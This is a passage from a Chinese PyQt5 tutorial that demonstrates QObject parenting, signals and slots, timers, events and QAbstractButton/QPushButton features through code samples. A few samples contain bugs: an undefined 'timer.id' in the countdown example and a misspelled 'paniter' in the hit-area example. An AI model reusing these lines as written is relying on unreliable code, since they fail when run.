<pre><code>obj1=QObject()
self.obj1=obj1
obj2=QObject()
obj2.setParent(obj1)

#监听obj2被释放
obj2.destroyed.connect(lambda :print('obj2被释放了'))

del self.obj1#当父对象被删除时，子对象会被自动释放【当对话框删除时，子窗口也会被释放】</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="134" src="https://images2.imgbox.com/50/67/4lxiK1K5_o.png" width="517"></p> 
<h4 id="3.3.3%20%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%A1%88%E4%BE%8B">3.3.3 应用场景与案例</h4> 
<p><img alt="" height="192" src="https://images2.imgbox.com/29/f8/NUTCCSvr_o.png" width="891"></p> 
<p><img alt="" height="463" src="https://images2.imgbox.com/c1/15/62HCoZK4_o.png" width="1067"></p> 
<pre><code>app=QApplication(sys.argv)

win1=QWidget()
win1.setStyleSheet('background-color:red;')
win1.setWindowTitle('红色')
win1.show()

win2 = QWidget()
win2.setStyleSheet('background-color:green;')
win2.setParent(win1)#儿子放在父亲里面
win2.resize(100,100)#儿子的窗口大小不可能超过父亲的，父亲会对其进行裁剪
win1.setWindowTitle('绿色')
win2.move(200,200)
win2.show()

sys.exit(app.exec_())</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="368" src="https://images2.imgbox.com/a5/64/dmj6Sov3_o.png" width="462"></p> 
<pre><code>win_root=QWidget()
win_root.resize(500,500)

label1=QLabel(win_root)
label1.setText('label1')


label2 = QLabel(win_root)
label2.setText('label2')
label2.move(50,50)

label3 = QLabel(win_root)
label3.setText('label3')
label3.move(100, 100)

btn=QPushButton(win_root)
btn.move(200,200)
btn.setText('btn')

win_root.show()
for sub_widget in win_root.findChildren(QObject):
    print(sub_widget)
    sub_widget.setStyleSheet('background-color:green')</code></pre> 
<p>运行效果图：</p> 
<p><img alt="" height="547" src="https://images2.imgbox.com/0c/2f/UY17pn95_o.png" width="501"></p> 
<p><img alt="" height="251" src="https://images2.imgbox.com/18/fa/pSncaaIs_o.png" width="883"></p> 
<h3 id="3.4%20%E4%BF%A1%E5%8F%B7%E4%B8%8E%E6%A7%BD%E6%9C%BA%E5%88%B6">3.4 信号与槽机制</h3> 
<p><img alt="" height="697" src="https://images2.imgbox.com/95/e3/iazxLdPL_o.png" width="772"></p> 
<p><img alt="" height="614" src="https://images2.imgbox.com/b1/d4/3Ujlx4D9_o.png" width="1200"></p> 
<h4 id="3.4.1%20API">3.4.1 API</h4> 
<p><img alt="" height="416" src="https://images2.imgbox.com/76/41/Pn7J1Opk_o.png" width="862"></p> 
<pre><code>self.obj=QObject()
#obj.destroyed对象释放时触发
#obj.objectNameChanged对象名字改变时触发

def destroy_cao(obj):
    print('{}对象被释放了...'.format(obj))
self.obj.destroyed.connect(destroy_cao)

def obj_name_cao(name):
    print('对象名称发生了改变:',name)
self.obj.objectNameChanged.connect(obj_name_cao)#connect只是建立连接，但不发出信号
self.obj.setObjectName('xxx')
print('信号是否已经阻断：',self.obj.signalsBlocked(),' 1')#True表示阻断，False表示没有阻断
#self.obj.objectNameChanged.disconnect()#取消名字改变的连接
self.obj.blockSignals(True)#临时阻断信号与槽的连接，
self.obj.setObjectName('ooo')
print('信号是否已经阻断：', self.obj.signalsBlocked(), ' 2')
self.obj.blockSignals(False)#恢复连接
self.obj.setObjectName('xxoo')
print('信号是否已经阻断：', self.obj.signalsBlocked(), ' 3')
del self.obj</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="334" src="https://images2.imgbox.com/29/cb/lknO64xz_o.png" width="996"></p> 
<p><strong>一个信号连接多个槽函数代码测试： </strong></p> 
<pre><code>self.obj=QObject()
def obj_name_cao1(name):
    print('对象名字发生改变1：',name)
def obj_name_cao2(name):
    print('对象名字发生改变2：',name)
self.obj.objectNameChanged.connect(obj_name_cao1)#一个信号连接多个槽函数
self.obj.objectNameChanged.connect(obj_name_cao2)

self.obj.setObjectName('xxx')
</code></pre> 
<p>结果展示：</p> 
<p><img alt="" height="182" src="https://images2.imgbox.com/6c/c3/eDO3bWT7_o.png" width="523"></p> 
<h4 id="3.4.2%20%E6%A1%88%E4%BE%8B">3.4.2 案例</h4> 
<p><img alt="" height="275" src="https://images2.imgbox.com/66/e4/vkCaeQPd_o.png" width="1121"></p> 
<blockquote> 
 <p><strong>案例一：</strong></p> 
 <p><strong>        </strong>当用户点击按钮的时候,打印"点我干啥?"</p> 
</blockquote> 
<pre><code>btn=QPushButton(self)
btn.resize(100,50)
btn.move(200,200)
btn.setText('点击我')
def click_cao():
    print('点我干啥？')
btn.clicked.connect(click_cao)
</code></pre> 
<p><strong>案例一效果图：</strong></p> 
<p><img alt="" height="303" src="https://images2.imgbox.com/17/f7/HzzuWFkg_o.png" width="279"></p> 
<p> <img alt="" height="190" src="https://images2.imgbox.com/9d/83/ozzSOM39_o.png" width="528"></p> 
<blockquote> 
 <p><strong>案例二：</strong></p> 
 <p><strong>要求：</strong></p> 
 <ul><li>后续我们修改标题为"Hello 张梦姣；最终会自动变为"你真棒！"</li><li>支持多次修改</li></ul> 
 <p><strong>涉及知识点：</strong></p> 
 <ul><li>设置窗口标题</li><li>监听窗口标题改变信号</li><li>临时取消/恢复信号与槽的连接</li></ul> 
</blockquote> 
<pre><code>win=QWidget()
win.setWindowTitle('梦之窗')

def title_cao(title):
    print('窗口标题变化了:',title)
    win.windowTitleChanged.disconnect()#或者 win.blockSignals(True)
    win.setWindowTitle(title+' 你真棒！')#不让这句触发槽函数，否则死循环
    win.windowTitleChanged.connect(title_cao)# win.blockSignals(False)

win.windowTitleChanged.connect(title_cao)
win.setWindowTitle('张梦姣')
win.setWindowTitle('李四')

win.show()</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="418" src="https://images2.imgbox.com/b1/d3/zHVWhPAo_o.png" width="508">    </p> 
<p><img alt="" height="188" src="https://images2.imgbox.com/99/2e/DEDoS1UG_o.png" width="580"></p> 
<h3 id="3.5%20%E7%B1%BB%E5%9E%8B%E5%88%A4%E5%AE%9A">3.5 类型判定</h3> 
<p><img alt="" height="152" src="https://images2.imgbox.com/cf/22/oJK6Vk5i_o.png" width="436"></p> 
<h4 id="3.5.1%20API%C2%A0">3.5.1 API </h4> 
<pre><code>obj=QObject()#False
w=QWidget()#True
btn=QPushButton()#True
label=QLabel()#True

objs=[obj,w,btn,label]
for o in objs:
    print(o.inherits("QWidget")) # &lt;==&gt; print(o.isWidgetType())#判断是否是控件类型</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="202" src="https://images2.imgbox.com/e1/7f/632A01oW_o.png" width="428"></p> 
<h4 id="3.5.2%20%E6%A1%88%E4%BE%8B">3.5.2 案例</h4> 
<p><img alt="" height="215" src="https://images2.imgbox.com/7b/df/Ki8jjqGq_o.png" width="968"></p> 
<pre><code>label1=QLabel(self)
label1.setText('label1')
label1.move(100,100)
label2 = QLabel(self)
label2.setText('label2')
label2.move(150, 150)
btn=QPushButton(self)
btn.setText('点我')
btn.move(200, 200)

for widget in  self.children():
    if widget.inherits('QLabel'):
        widget.setStyleSheet('background-color:cyan;')</code></pre> 
<p>运行结果： </p> 
<p><img alt="" height="545" src="https://images2.imgbox.com/31/2a/UDI48Wpc_o.png" width="512"></p> 
<h3 id="3.6%20%E5%AF%B9%E8%B1%A1%E5%88%A0%E9%99%A4">3.6 对象删除</h3> 
<p><img alt="" height="197" src="https://images2.imgbox.com/f8/53/EpzAg9rj_o.png" width="1200"></p> 
<blockquote> 
 <p><strong> 删除对象：</strong>是在最后真正删除的，不管是不是在代码中间就手动删除了。</p> 
</blockquote> 
<pre><code>self.obj1=QObject()
self.obj2=QObject()
self.obj3=QObject()
print('obj1:',self.obj1)
print('obj2:',self.obj2)
print('obj3:',self.obj3)
self.obj3.setParent(self.obj2)
self.obj2.setParent(self.obj1)

self.obj1.destroyed.connect(lambda : print('obj1被释放了！'))
self.obj2.destroyed.connect(lambda : print('obj2被释放了！'))
self.obj3.destroyed.connect(lambda : print('obj3被释放了！'))

"""
    deleteLater()并没有将对象立即销毁，而是向主消息循环发送了一个event，
    下一次主消息循环收到这个event之后才会销毁对象。
    好处是可以在这些延迟删除的时间内完成一些操作；
    坏处就是内存释放会不及时。
"""
self.obj2.deleteLater()
#del self.obj2
print(self.obj1.children()) #obj2被释放了，obj1还有孩子</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="364" src="https://images2.imgbox.com/ab/0d/DRLWRUxw_o.png" width="869"></p> 
<h3 id="3.7%20%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">3.7 事件处理</h3> 
<p><img alt="" height="342" src="https://images2.imgbox.com/d0/7a/jQmqTm7W_o.png" width="797"></p> 
<p><img alt="" height="232" src="https://images2.imgbox.com/d2/4a/UCRoqFGb_o.png" width="806"></p> 
<p><img alt="" height="467" src="https://images2.imgbox.com/02/92/dWgGUJxW_o.png" width="1177"></p> 
<pre><code>import sys
from PyQt5.Qt import *

class App(QApplication):
    def notify(self,recevier,evt):#重写父类中的notify方法，recevier：事件的接收者，evt：事件本身
        if recevier.inherits('QPushButton') and evt.type()==QEvent.MouseButtonPress:
            print(recevier,evt)
        return super().notify(recevier,evt)

class Btn(QPushButton):
    def event(self,evt):#重写父类中的event
        if evt.type()==QEvent.MouseButtonPress:
            print(evt)
        return super().event(evt)

    def mousePressEvent(self,*args,**kwargs):
        print('鼠标被按下了...')
        return super().mousePressEvent(*args,**kwargs)

app=App(sys.argv)#重写QApplication类，自定义功能
window=QWidget()
btn=Btn(window)
btn.setText('按钮')
btn.move(100,100)
def press_cao():
    print('按钮被点击了！')



btn.pressed.connect(press_cao)

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="222" src="https://images2.imgbox.com/db/e9/ap94rE7D_o.png" width="243"></p> 
<p><img alt="" height="243" src="https://images2.imgbox.com/65/49/EnRy22XY_o.png" width="1200"></p> 
<h3 id="3.8%20%E5%AE%9A%E6%97%B6%E5%99%A8">3.8 定时器</h3> 
<p><img alt="" height="454" src="https://images2.imgbox.com/82/d6/cqP6obZk_o.png" width="1200"></p> 
<h4 id="3.8.1%20API">3.8.1 API</h4> 
<pre><code>from PyQt5.Qt import *
import sys

class MyObject(QObject):
    def timerEvent(self,evt):
        print(evt,' 1')


class Window(QWidget):#继承QWidget类
    def __init__(self):
        super().__init__()
        self.setWindowTitle('QObject定时器的使用')
        self.resize(500, 500)
        obj=MyObject(self)
        timer_id=obj.startTimer(1000)#1000毫秒
        obj.killTimer(timer_id)#因为可能会开好几个定时器


if __name__=='__main__':
    app=QApplication(sys.argv)

    window=Window()
    window.show()

    sys.exit(app.exec_())</code></pre> 
<h4 id="3.8.2%20%E6%A1%88%E4%BE%8B">3.8.2 案例</h4> 
<p><img alt="" height="88" src="https://images2.imgbox.com/17/a6/WNXsVf18_o.png" width="654"></p> 
<p>案例一：设计10秒定时</p> 
<p><img alt="" height="155" src="https://images2.imgbox.com/4e/e1/zhYKgj0r_o.png" width="702"></p> 
<pre><code>from PyQt5.Qt import *
import sys

class MyObject(QObject):
    def timerEvent(self,evt):
        print(evt,' 1')

class Mylabel(QLabel):
    def __init__(self,*args,**kwargs):
        super().__init__(*args,**kwargs)
        self.setText('10')  # 10秒
        self.move(100, 100)
        self.setStyleSheet('font-size:22px;')

    def setSec(self,sec):
        self.setText(str(sec))

    def startMyTimer(self,ms):
        self.timer_id = self.startTimer(ms)  # 每隔1秒会调用label的timerEvent方法

    def timerEvent(self,*args,**kwargs):#每隔设定时间执行一下timerEvent函数
        #获取当前标签的内容
        current_sec=int(self.text())
        current_sec-=1
        self.setText(str(current_sec))
        if current_sec==0:
            print('时间到！')
            self.killTimer(timer.id)

class Window(QWidget):#继承QWidget类
    def __init__(self):
        super().__init__()
        self.setWindowTitle('QObject定时器案例一')
        self.resize(500, 500)
        label =Mylabel(self)
        label.setSec(10)
        label.startMyTimer(500)#500毫秒


if __name__=='__main__':
    app=QApplication(sys.argv)

    window=Window()
    window.show()

    sys.exit(app.exec_())</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="306" src="https://images2.imgbox.com/0f/49/E5VotpI6_o.png" width="282"><img alt="" height="301" src="https://images2.imgbox.com/a0/ac/skmF3Dez_o.png" width="282"></p> 
<p><img alt="" height="83" src="https://images2.imgbox.com/6e/4a/uT1sZw68_o.png" width="640"></p> 
<p>案例二：通过定时器不断修改窗口尺寸</p> 
<pre><code>from PyQt5.Qt import *
import sys

class MyWidget(QWidget):
    def timerEvent(self,*args,**kwargs):
        current_w=self.width()
        current_h=self.height()
        self.resize(current_w+10,current_h+10)

if __name__ == '__main__':
    app = QApplication(sys.argv)

    window = MyWidget()
    window.setWindowTitle('定时修改窗口大小')
    window.resize(50,50)
    window.startTimer(100)#每隔100ms会调用timerEvent
    window.show()

    sys.exit(app.exec_())</code></pre> 
<h2 id="4.QAbstractButton">4.QAbstractButton</h2> 
<p><img alt="" height="327" src="https://images2.imgbox.com/44/b7/CI0gp1fI_o.png" width="1200"></p> 
<p><img alt="" height="564" src="https://images2.imgbox.com/94/df/7ARcD48u_o.png" width="862"></p> 
<p><img alt="" height="217" src="https://images2.imgbox.com/7b/3b/OIEluFIR_o.png" width="742"></p> 
<h3 id="4.1%20%E5%AD%90%E7%B1%BB%E5%8C%96%E6%8A%BD%E8%B1%A1%E7%B1%BB">4.1 子类化抽象类</h3> 
<blockquote> 
 <p>不能直接使用抽象类QAbstractButton，需要子类化(如下)，或者使用封装的具体类。 </p> 
</blockquote> 
<pre><code>from PyQt5.Qt import *
import sys

class Window(QWidget):#继承QWidget类
    def __init__(self):
        super().__init__()
        self.setWindowTitle('QAbstractButton')
        self.resize(500, 500)

class Btn(QAbstractButton):
    def paintEvent(self,evt):
        print('绘制按钮')
        #绘制按钮上要展示的一个界面内容
        #需要画家、画板、画笔  ==&gt; 画画
        #1 创建一个画家，画在self地方
        painter=QPainter(self)
        #2 给画家一支笔
        #2.1 创建一支笔
        pen=QPen(QColor(110,200,20),5)#QColor：RGB，第二个参数：笔粗细
        #2.2 画家拿着笔
        painter.setPen(pen)
        #3 画家画画
        painter.drawText(25,40,self.text())#点(20,20),内容
        painter.drawEllipse(0,0,100,100)#给一个矩形，画的其实是矩形的内切圆


if __name__=='__main__':
    app=QApplication(sys.argv)

    window=Window()
    btn=Btn(window)
    btn.setText('我是一名高级画师')
    btn.resize(100,100)
    btn.pressed.connect(lambda :print('点击了这个按钮'))
    window.show()

    sys.exit(app.exec_())</code></pre> 
<h3 id="4.2%20%E6%96%87%E6%9C%AC%E8%AE%BE%E7%BD%AE">4.2 文本设置</h3> 
<p><img alt="" height="408" src="https://images2.imgbox.com/b7/ac/Wb7IQj3C_o.png" width="877"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

btn=QPushButton(window)
btn.setText('1')
#每当点击的时候，数字累加1
def plus_one_cao():
    num=int(btn.text())+1
    btn.setText(str(num))
btn.pressed.connect(plus_one_cao)
window.show()
sys.exit(app.exec_())</code></pre> 
<p>点击效果：</p> 
<p><img alt="" height="468" src="https://images2.imgbox.com/da/75/SYus9vuK_o.png" width="437"></p> 
<h3 id="4.3%20%E5%9B%BE%E6%A0%87%E7%9B%B8%E5%85%B3">4.3 图标相关</h3> 
<p><img alt="" height="260" src="https://images2.imgbox.com/c8/a3/jZWLptxo_o.png" width="681"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

btn=QPushButton(window)
btn.move(150,150)
# ***************图标操作***************开始
icon=QIcon('校徽.jpg')
btn.setIcon(icon)
size=QSize(200,200)#宽，高  ==&gt; 把按钮撑大了
btn.setIconSize(size)
#也可以获取信息
print(btn.icon())
print('尺寸大小：',btn.iconSize())
# ***************图标操作***************结束
window.show()
sys.exit(app.exec_())</code></pre> 
<p>效果图：</p> 
<p><img alt="" height="542" src="https://images2.imgbox.com/8a/39/6BbM57GO_o.png" width="495"></p> 
<h3 id="4.4%20%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E9%94%AE%C2%A0">4.4 设置快捷键 </h3> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

btn=QPushButton(window)
btn.move(150,150)

# # ***************文本操作***************开始
# btn.setText('1')
# #每当点击的时候，数字累加1
# def plus_one_cao():
#     num=int(btn.text())+1
#     btn.setText(str(num))
# btn.pressed.connect(plus_one_cao)
# # ***************文本操作***************结束


# ***************图标操作***************开始
icon=QIcon('校徽.jpg')
btn.setIcon(icon)
size=QSize(200,200)#宽，高  ==&gt; 把按钮撑大了
btn.setIconSize(size)
#也可以获取信息
print(btn.icon())
print('尺寸大小：',btn.iconSize())
# ***************图标操作***************结束


# ***************快捷键的设定***************开始
btn.pressed.connect(lambda : print('按钮被点击了'))

#1.设置文本快捷键
btn.setText('&amp;lbc')#在字符串里的前面加一个&amp;符号  快捷键：alt键+&amp;后面的一个字母l
#当然&amp;符号也可以放中间
btn.setText('a&amp;bc')#快捷键：alt+b   ==&gt;第一种快捷键alt_l被覆盖了，后面的覆盖前面的

#2.可以用图标当作快捷键
btn.setShortcut("alt+q")
# ***************快捷键的设定***************结束

window.show()
sys.exit(app.exec_())</code></pre> 
<h3 id="4.5%20%E8%87%AA%E5%8A%A8%E9%87%8D%E5%A4%8D">4.5 自动重复</h3> 
<p><img alt="" height="493" src="https://images2.imgbox.com/9b/0b/x9kDiLsv_o.png" width="942"></p> 
<blockquote> 
 <p><strong>自动重复：</strong>就是用户按着按钮不松，就会一直触发。 比如自动开枪一样，点击一直发射。</p> 
</blockquote> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

btn=QPushButton(window)
btn.move(150,150)


# ***************图标操作***************开始
icon=QIcon('子弹.jpg')
btn.setIcon(icon)
size=QSize(200,200)#宽，高  ==&gt; 把按钮撑大了
btn.setIconSize(size)

# ***************图标操作***************结束



# ***************自动重复***************开始
btn.setText('开枪')
btn.pressed.connect(lambda : print('咚咚咚...'))
print(btn.autoRepeat())#此时还没开启自动重复
btn.setAutoRepeat(True)
btn.setAutoRepeatDelay(2000)#检测时延
btn.setAutoRepeatInterval(1000)#自动重复检测检测间隔
# ***************自动重复***************结束

window.show()
sys.exit(app.exec_())</code></pre> 
<p>效果图：</p> 
<p><img alt="" height="389" src="https://images2.imgbox.com/7d/ef/NKy9xhIs_o.png" width="613"></p> 
<h3 id="4.6%20%E7%8A%B6%E6%80%81%E8%AF%BB%E5%8F%96">4.6 状态读取</h3> 
<p><img alt="" height="420" src="https://images2.imgbox.com/cf/80/X15hIdIl_o.png" width="869"></p> 
<p><img alt="" height="185" src="https://images2.imgbox.com/a7/3d/A6O0YzWk_o.png" width="654"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

btn=QPushButton(window)
btn.setText('总开关【全选/全不选】')
btn.setStyleSheet('font-size:20px;color:green;')
btn.resize(220,50)#宽，高


# ***************状态设定***************开始
push_button=QPushButton(window)
push_button.setText('这是QPushButton')
push_button.move(100,100)

radio_button=QRadioButton(window)
radio_button.setText('这是一个radio')
radio_button.move(100,150)

checkbox=QCheckBox(window)
checkbox.setText('这是一个checkbox')
checkbox.move(100,200)

#1.按下状态
push_button.setStyleSheet('QPushButton:pressed{background-color:red;}')
#把三个按钮都设置为按下状态
push_button.setDown(True)
radio_button.setDown(True)
checkbox.setDown(True)

#2.选中状态
#2.1 isCheckable()：表示是否可以被选中，为权限；setCheckable():设定，为状态
print('push_button是否可以被选中：',push_button.isCheckable())#默认是False，但可以通过设定为True
push_button.setCheckable(True)#只是样式不好看，但可以通过setStyleSheet()进行设定
print('radio_button是否可以被选中：',radio_button.isCheckable())#True
print('checkbox是否可以被选中：',checkbox.isCheckable())#True
#2.2 代码选中,setChecked()，为动作
push_button.setChecked(True)
radio_button.setChecked(True)
checkbox.setChecked(True)
#2.3 查看状态isChecked()
print(push_button.isChecked())
print(radio_button.isChecked())
print(checkbox.isChecked())

def cao():
    # push_button.toggle()#切换选中与非选中状态
    # radio_button.toggle()
    # checkbox.toggle()
    #或者
    push_button.setChecked(not push_button.isChecked())
    radio_button.setChecked(not push_button.isChecked())
    checkbox.setChecked(not push_button.isChecked())

btn.pressed.connect(cao)

# ***************状态设定***************结束

window.show()
sys.exit(app.exec_())</code></pre> 
<p>效果图：</p> 
<p><img alt="" height="542" src="https://images2.imgbox.com/50/dd/xSrGN1dm_o.png" width="1014"></p> 
<h3 id="4.7%20%E6%8E%92%E4%BB%96%E6%80%A7">4.7 排他性</h3> 
<p><img alt="" height="255" src="https://images2.imgbox.com/d5/c9/OWJ01OBe_o.png" width="686"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)
# ***************6.1排他性设置***************开始
for i in range(0,3):
    btn=QPushButton(window)#QPushButton默认不具有排他性
    btn.setText('btn'+str(i))
    btn.move(50*i,50*i)
    btn.setAutoExclusive(True)#设置排他性
    #print(btn.antoExclusive())
    #print(btn.isCheckable())
    btn.setCheckable(True)

btn=QPushButton(window)
btn.setText('btn3')#这个其他三个没有任何关系
btn.move(350,50)
btn.setCheckable(True)

# ***************6.1排他性设置***************结束

# ***************6.2排他性设置***************开始
for i in range(0,3):
    btn=QRadioButton(window)#QRadioButton默认排他性
    btn.setText('btn'+str(i))
    btn.move(50*i+200,50*i+200)

    #取消排他性
    btn.setAutoExclusive(False)
# ***************6.2排他性设置***************结束

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果： </p> 
<p><img alt="" height="455" src="https://images2.imgbox.com/28/d3/cH33DKOx_o.png" width="419"></p> 
<pre><code># ***************6.3多选框QCheckBox***************开始
for i in range(0,3):
    btn=QCheckBox(window)#QRadioButton默认排他性
    btn.setText('btn'+str(i))
    btn.move(50*i,50*i)
    #设置排他性
    btn.setAutoExclusive(True)
# ***************6.3多选框QCheckBox***************结束
</code></pre> 
<p>运行结果： </p> 
<p><img alt="" height="404" src="https://images2.imgbox.com/c3/07/v9l17uhZ_o.png" width="376"></p> 
<h3 id="4.8%20%E6%A8%A1%E6%8B%9F%E7%82%B9%E5%87%BB">4.8 模拟点击</h3> 
<p><img alt="" height="202" src="https://images2.imgbox.com/df/ed/6zcKIY9s_o.png" width="477"></p> 
<h4 id="4.8.1%20%E4%BB%A3%E7%A0%81%E6%A8%A1%E6%8B%9F%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%C2%A0">4.8.1 代码模拟鼠标点击 </h4> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

# ***************7.模拟点击***************开始
btn1=QPushButton(window)
btn1.setText('按钮1')
btn1.move(200,200)
btn1.resize(110,70)
btn1.setStyleSheet('color:green;font-size:20px')
btn1.pressed.connect(lambda : print('点击了按钮1'))
#模拟点击
#btn.click()#点一下就松开了
#btn.animateClick(2000)#相当于鼠标点中按钮不松2s

btn2=QPushButton(window)
btn2.setText('按钮2')
btn2.resize(110,70)
btn2.setStyleSheet('color:red;font-size:20px')
def test():
    #btn1.click()#用按钮2控制按钮1的操作
    btn1.animateClick(2000)
btn2.pressed.connect(test)
# ***************7.模拟点击***************结束

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="553" src="https://images2.imgbox.com/45/27/9ahx0B2L_o.png" width="806"></p> 
<h4 id="4.8.2%20%E8%AE%BE%E7%BD%AE%E7%82%B9%E5%87%BB%E6%9C%89%E6%95%88%E5%8C%BA%E5%9F%9F">4.8.2 设置点击有效区域</h4> 
<p></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

# ***************7.2设置点击区域***************开始
class Btn(QPushButton):
    def hitButton(self,point):
        print('坐标为({},{})'.format(point.x(),point.y()))

        # #点击按钮的左半部分有效，右半部分无效
        # if point.x()&gt;self.width()/2:
        #     return False#返回True表明点point是有效的
        # else:
        #     return True

        #设置内切圆内部有效，外部无效
        yuanxin_x = self.width() / 2
        yuanxin_y = self.height() / 2
        hit_x=point.x()
        hit_y=point.y()
        if ((hit_x-yuanxin_x)**2+(hit_y-yuanxin_y)**2)**0.5 &lt;=self.width() / 2:
            return True
        else:
            return False
    #画内切圆
    def paintEvent(self,evt):
        super().paintEvent(evt)
        painter=QPainter(self)
        painter.setPen(QPen(QColor(100,150,200),6))
        paniter.drawEllipse(self.rect())

btn=Btn(window)
btn.setText('点击')
btn.setStyleSheet('color:red;font-size:40px;')
btn.resize(200,200)
btn.move(150,150)

btn.pressed.connect(lambda :print('按钮被点击了'))
# ***************7.2设置点击区域***************结束

window.show()
sys.exit(app.exec_())</code></pre> 
<p><img alt="" height="387" src="https://images2.imgbox.com/e0/bd/bENmjJyV_o.png" width="360"></p> 
<h3 id="4.9%20%E5%8F%AF%E7%94%A8%E4%BF%A1%E5%8F%B7">4.9 可用信号</h3> 
<p><img alt="" height="227" src="https://images2.imgbox.com/9c/ce/smQ8A0s2_o.png" width="695"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮的功能测试-抽象类')
window.resize(500,500)

btn=QPushButton(window)
btn.move(100,100)
btn.setText('点击')
btn.resize(200,200)
btn.pressed.connect(lambda:print('按钮被按下了'))
btn.released.connect(lambda:print('按钮鼠标被释放了'))
btn.clicked.connect(lambda value:print('按钮被点击',value))
#切换
btn.toggled.connect(lambda value:print('状态发生了改变:',value))

window.show()
sys.exit(app.exec_())</code></pre> 
<p>可以自行测试效果。</p> 
<h2 id="5.QPushButton%C2%A0">5.QPushButton </h2> 
<p><img alt="" height="767" src="https://images2.imgbox.com/c0/02/QHd4bvV1_o.png" width="1083"><img alt="" height="598" src="https://images2.imgbox.com/37/58/EYp5wfkY_o.png" width="1111"></p> 
<h3 id="5.1%20%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">5.1 构造函数</h3> 
<p><strong>第一种：</strong>按钮和主窗口分开 </p> 
<pre><code>from PyQt5.Qt import *
import sys
app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QPushButton按钮的功能')
window.resize(500,500)
#第一种情况
btn=QPushButton()
btn.setText('按钮')
btn.show()

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果1：</p> 
<p><img alt="" height="441" src="https://images2.imgbox.com/af/07/m2UQc8ZU_o.png" width="530"></p> 
<p><strong>第二种</strong>：按钮在窗口中</p> 
<pre><code>#第二种情况
btn=QPushButton(window)
btn.setText('按钮')
btn.move(200,200)
btn.resize(110,70)


#第三种情况
btn=QPushButton()
btn.setParent(window)
btn.setText('按钮')
btn.move(200,200)
btn.resize(110,70)</code></pre> 
<p>运行结果2： </p> 
<p><img alt="" height="473" src="https://images2.imgbox.com/5c/b7/NnBQg94d_o.png" width="434"></p> 
<pre><code>#显示图片
btn=QPushButton(window)
btn.move(150,150)
icon=QIcon('子弹.jpg')
btn.setIcon(icon)
size=QSize(200,200)#宽，高  ==&gt; 把按钮撑大了
btn.setIconSize(size)#注意：是setIconSize


#显示图片 简洁版
btn=QPushButton(QIcon('子弹.jpg'),'子弹',window)</code></pre> 
<p>显示结果3： </p> 
<p><img alt="" height="401" src="https://images2.imgbox.com/ec/48/kio38EuL_o.png" width="364"></p> 
<h3 id="5.2%20%E8%8F%9C%E5%8D%95%E8%AE%BE%E7%BD%AE">5.2 菜单设置</h3> 
<p><img alt="" height="480" src="https://images2.imgbox.com/62/2e/FZLbtXoU_o.png" width="592"></p> 
<pre><code>from PyQt5.Qt import *
import sys
app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QPushButton按钮的功能')
window.resize(500,500)

# ***************菜单设置***************开始
btn=QPushButton(window)
btn.resize(100,50)
btn.setText('文件操作')
btn.setStyleSheet('background-color:gray;font-size:20px;border:1px solid gray;')
menu=QMenu()#创建菜单
#子菜单：最近打开
open_recent_menu=QMenu(menu)
open_recent_menu.setTitle('最近打开')
#行为动作：新建  打开  分割线  退出
# new_action=QAction()
# new_action.setText('新建')
# new_action.setIcon(QIcon('图片\文件操作icon\新建文件.png'))
new_action=QAction(QIcon('图片\文件操作icon\新建文件.png'),'新建',menu)
new_action.triggered.connect(lambda:print('新建文件'))

open_action=QAction(QIcon('图片\文件操作icon\打开文件.png'),'打开',menu)
open_action.triggered.connect(lambda:print('打开文件'))


exit_action=QAction(QIcon('图片\文件操作icon\退出文件.png'),'退出',menu)
exit_action.triggered.connect(lambda:print('退出程序'))

file_action=QAction('PyQt5')

menu.addAction(new_action)
menu.addAction(open_action)
open_recent_menu.addAction(file_action)
menu.addMenu(open_recent_menu)#添加子菜单
menu.addSeparator()#添加分割线
menu.addAction(exit_action)

btn.setMenu(menu)

window.show()
btn.showMenu()
# ***************菜单设置***************结束


sys.exit(app.exec_())</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="398" src="https://images2.imgbox.com/38/5d/IJx8JLxe_o.png" width="366"></p> 
<h3 id="5.3%20%E6%89%81%E5%B9%B3%E5%8C%96">5.3 扁平化</h3> 
